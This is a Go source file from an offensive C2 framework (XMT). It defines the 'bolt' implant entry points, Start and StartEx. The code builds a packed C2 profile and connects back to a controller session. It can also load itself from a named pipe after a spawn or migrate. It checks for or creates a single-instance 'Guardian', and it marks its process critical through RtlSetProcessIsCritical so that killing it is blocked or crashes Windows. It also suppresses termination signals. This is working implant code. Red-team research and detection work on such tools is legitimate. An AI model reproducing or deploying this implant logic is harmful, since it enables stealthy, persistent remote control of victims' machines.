// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package bolt

import (
	"context"
	"os"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util"
)

// Start attempts to create a Bolt instance with the supplied arguments.
// This function will block and will NOT return (it calls 'device.GoExit').
//
// This function makes some default assumptions and has the following options
// set: 'ignore=false', 'load=true', 'critical=true'. These can be changed by
// using the 'StartEx' function instead.
//
// Arguments:
//   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
//   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
//               THIS NAME, it will be formatted based on the Linker type.
//   pipe     - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
//               a non-formatted name to be passed to any Spawn/Migrate commands.
//   c        - Packed Config. The resulting profile will be build when the function
//               starts and will silently return if it fails.
func Start(l man.Linker, guard, pipe string, c cfg.Config) {
	StartEx(false, true, true, l, guard, pipe, c)
}

// StartEx attempts to create a Bolt instance with the supplied arguments.
// This function will block and will NOT return (it calls 'device.GoExit').
//
// Arguments:
//   ignore   - If True, this will ignore any currently existing Guardians with
//               the same guard name.
//   load     - If True, this Bolt will look to see if it's being launched as a
//               Spawn/Migrate callable. This will use the supplied 'pipe' argument
//               to look for (This is the 'pipe' argument passed to spawn/migrate).
//   critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
//               (Windows only obviously). And will make itself un-terminatable
//               while running.
//   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
//   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
//               THIS NAME, it will be formatted based on the Linker type.
//   pipe     - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
//               a non-formatted name to be passed to any Spawn/Migrate commands.
//   c        - Packed Config. The resulting profile will be build when the function
//               starts and will silently return if it fails.
func StartEx(ignore, load, critical bool, l man.Linker, guard, pipe string, c cfg.Config) {
	p, err := c.Build()
	if err != nil {
		return
	}
	var (
		x, f = context.WithCancel(context.Background())
		s    *c2.Session
	)
	if load {
		if s, _ = c2.LoadContext(x, nil, pipe, time.Millisecond*500); s != nil && len(guard) > 0 {
			go func() {
				time.Sleep(time.Second * time.Duration(2+uint64(util.FastRandN(3))))
				man.GuardContext(x, l, guard)
			}()
		}
	}
	if s == nil {
		if len(guard) > 0 {
			if man.Check(l, guard) && !ignore {
				f()
				return
			}
			man.GuardContext(x, l, guard)
		}
		if s, _ = c2.ConnectContext(x, nil, p); s == nil {
			f()
			return
		}
	}
	limits.Ignore()
	limits.MemorySweep(x)
	var (
		w = make(chan os.Signal, 1)
		z bool
	)
	if limits.Notify(w, syscall.SIGINT, syscall.SIGTERM); critical {
		z, _ = device.SetCritical(true)
	}
	select {
	case <-w:
	case <-x.Done():
	case <-s.Done():
	}
	if s.Close(); critical && !z {
		device.SetCritical(false)
	}
	limits.Reset()
	limits.StopNotify(w)
	close(w)
	f()
	device.GoExit()
}
